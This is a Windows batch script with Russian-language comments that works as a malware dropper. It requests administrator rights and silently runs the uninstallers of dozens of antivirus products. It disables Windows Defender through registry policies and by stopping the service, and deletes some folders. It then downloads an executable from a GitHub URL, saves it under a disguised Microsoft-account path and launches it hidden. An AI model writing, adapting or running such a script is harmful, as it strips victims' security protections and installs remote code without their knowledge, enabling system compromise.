@echo off
setlocal

:: Возврат прав администратора
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || powershell -command "Start-Process -Verb RunAs"

:: Удаление антивирусных программ
for %%P in (
    "%PROGRAMFILES%\AVAST Software\Avast\setup\instup.exe"
    "%PROGRAMFILES%\AVG\Setup\avgsetupx.exe"
    "%PROGRAMFILES%\Norton\NortonInstaller.exe"
    "C:\Program Files\McAfee\MSC\mcuihost.exe"
    "C:\Program Files (x86)\Avira\Launcher\Avira.Systray.exe"
    "C:\Program Files (x86)\Panda Security\Panda Security Protection\Setup.exe"
    "C:\Program Files (x86)\TotalAV\uninstall.exe"
    "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro\uninstall.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security\avpui.exe"
    "C:\Program Files (x86)\Grizzly Antivirus\uninstall.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security\avpui.exe"
    "C:\Program Files\Doctor Web\Setup\drweb32.exe"
    "C:\Program Files (x86)\Microsoft Defender Antivirus\mpam-dll.exe"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security\quickheal.exe"
    "C:\Program Files (x86)\VIPRE\vipre.exe"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Plus\bdagent.exe"
    "C:\Program Files (x86)\ESET\ESET NOD32 Antivirus\NOD32Krnl.exe"
    "C:\Program Files (x86)\Sophos\AutoUpdate\AutoUpdate.exe"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity\kgp.exe"
    "C:\Program Files (x86)\F-Secure\Antivirus\FSAntivirus.exe"
    "C:\Program Files\Sophos\Sophos Endpoint Agent\SophosEndpoint.exe"
    "C:\Program Files\Dr.Web\drweb.exe"
    "C:\Program Files (x86)\Comodo\Comodo Antivirus\cavwp.exe"
    "C:\Program Files\BullGuard\BullGuard Antivirus\BGUi.exe"
    "C:\Program Files (x86)\ZoneAlarm\ZoneAlarm Security\zauninstall.exe"
    "C:\Program Files\Malwarebytes\Anti-Malware\unins000.exe"
    "C:\Program Files (x86)\Emsisoft\Anti-Malware\a2start.exe"
    "C:\Program Files (x86)\Fortinet\FortiClient\FortiClient.exe"
    "C:\Program Files (x86)\Webroot\WRSA.exe"
    "C:\Program Files (x86)\IKARUS\IKARUS antiVirus\uninstall.exe"
    "C:\Program Files (x86)\Rising\Rising Antivirus\Uninstall.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free Antivirus\avp.exe"
    "C:\Program Files (x86)\Norton Security\uninstall.exe"
    "C:\Program Files\eScan\eScan Antivirus\uninst.exe"
    "C:\Program Files (x86)\Panda Dome\uninstall.exe"
    "C:\Program Files (x86)\ESET\Smart Security\unins000.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud\avp.exe"
    "C:\Program Files\Symantec\Symantec Endpoint Protection\sepinstall.exe"
    "C:\Program Files\ZoneAlarm\ZoneAlarm\zav.exe"
    "C:\Program Files (x86)\Titanium\titanium.exe"
    "C:\Program Files (x86)\Iolo\System Mechanic\Uninstall.exe"
    "C:\Program Files (x86)\SpyHunter\unins000.exe"
    "C:\Program Files\Avira\Antivirus\uninstall.exe"
    "C:\Program Files (x86)\G DATA\Internet Security\gdata.exe"
    "C:\Program Files (x86)\BitDefender\Bitdefender Antivirus Free\uninstall.exe"
    "C:\Program Files (x86)\Panda Antivirus Pro\uninstall.exe"
    "C:\Program Files (x86)\Webroot\SecureAnywhere\WRSA.exe"
    "C:\Program Files (x86)\F-Secure\F-Secure Internet Security\fsavgui.exe"
    "C:\Program Files (x86)\McAfee\Total Protection\uninstall.exe"
    "C:\Program Files\K7 Computing\K7 Antivirus\uninstall.exe"
    "C:\Program Files (x86)\Avast Cleanup\AvastCleanup.exe"
    "C:\Program Files\Bitdefender\Bitdefender Security\unins000.exe"
    "C:\Program Files (x86)\Malwarebytes\Chameleon\Malwarebytes.exe"
    "C:\Program Files (x86)\Avira\Connect\Avira Connect.exe"
    "C:\Program Files (x86)\avast! antivirus\Setup\instup.exe"
    "C:\Program Files\Microsoft Security Client\SavUI.exe"
    "C:\Program Files (x86)\SUPERAntiSpyware\SUPERAntiSpyware.exe"
    "C:\Program Files (x86)\RogueKiller\RogueKiller.exe"
    "C:\Program Files (x86)\ESET\NOD32 Antivirus\uninst.exe"
    "C:\Program Files (x86)\Norton Security\uninstall.exe"
    "C:\Program Files (x86)\AVG\AVG Internet Security\avgsetup.exe"
    "C:\Program Files (x86)\Comodo\COMODO Internet Security\uninstall.exe"
    "C:\Program Files (x86)\Panda Security\Setup\uninstall.exe"
    "C:\Program Files (x86)\Avast\Avast Secure Browser\Application\AvastBrowser.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Labs\uninstall.exe"
    "C:\Program Files (x86)\Panda Security\panda.exe"
    "C:\Program Files\F-Secure\FSAV\uninstall.exe"
    "C:\Program Files (x86)\Microsoft\Windows Defender\uninstall.exe"
    "C:\Program Files (x86)\G DATA\G DATA Internet Security\uninstall.exe"
    "C:\Program Files (x86)\TrustPort\TrustPort Antivirus\uninstall.exe"
    "C:\Program Files (x86)\Zillya\Zillya Antivirus\uninstall.exe"
    "C:\Program Files (x86)\HitmanPro\HitmanPro\uninstall.exe"
    "C:\Program Files (x86)\AdwCleaner\AdwCleaner\uninstall.exe"
    "C:\Program Files (x86)\SpywareBlaster\SpywareBlaster\uninstall.exe"
    "C:\Program Files (x86)\Malwarebytes\AdwCleaner\MalwarebytesAdwCleaner.exe"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity\uninstall.exe"
    "C:\Program Files (x86)\Emsisoft\Emsisoft Emergency Kit\uninstall.exe"
    "C:\Program Files (x86)\Glary Utilities\Glary Utilities\uninstall.exe"
    "C:\Program Files (x86)\RegCleaner\RegCleaner\uninstall.exe"
    "C:\Program Files (x86)\Advanced SystemCare\Advanced SystemCare\uninstall.exe"
    "C:\Program Files (x86)\IObit Malware Fighter\IObit Malware Fighter\uninstall.exe"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Password Manager\uninstall.exe"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Anti-Theft\uninstall.exe"
    "C:\Program Files (x86)\ESET\ESET Mobile Security\uninstall.exe"
    "C:\Program Files (x86)\K7 Computing\K7 Antivirus Plus\uninstall.exe"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security\uninstall.exe"
    "C:\Program Files (x86)\F-Secure\F-Secure Safe\uninstall.exe"
    "C:\Program Files (x86)\Panda Security\Panda Global Protection\uninstall.exe"
    "C:\Program Files (x86)\G DATA\G DATA Total Security\uninstall.exe"
    "C:\Program Files (x86)\Trend Micro\trend micro\uninstall.exe"
    "C:\Program Files (x86)\Avast Software\Avast\uninstall.exe"
    "C:\Program Files (x86)\AVG\AVG\uninstall.exe"
    "C:\Program Files (x86)\Microsoft Security Essentials\MSE\uninstall.exe"
    "C:\Program Files (x86)\Windows Defender\Windows Defender\uninstall.exe"
) do (
    if exist "%%P" (
        start /b "" "%%P" >nul 2>&1
    )
)

:: Регистрация и остановка Windows Defender
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1

:: Удаление других программ и папок
for %%P in (
    "%USERPROFILE%\AppData\Local\360SecureBrowser"
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
    "C:\Program Files\AVG\Browser\Application"
) do (
    rd /S /Q "%%~P" >nul 2>&1
)

:: Скачивание и запуск дополнительного программного обеспечения
mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1
powershell -Command "Invoke-Webrequest 'https://github.com/SchoolSigmaBoy/SchoolSigma/raw/main/SigmaBoy.exe' -OutFile 'C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe'" >nul 2>&1
start /b "" "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe" >nul 2>&1

exit /b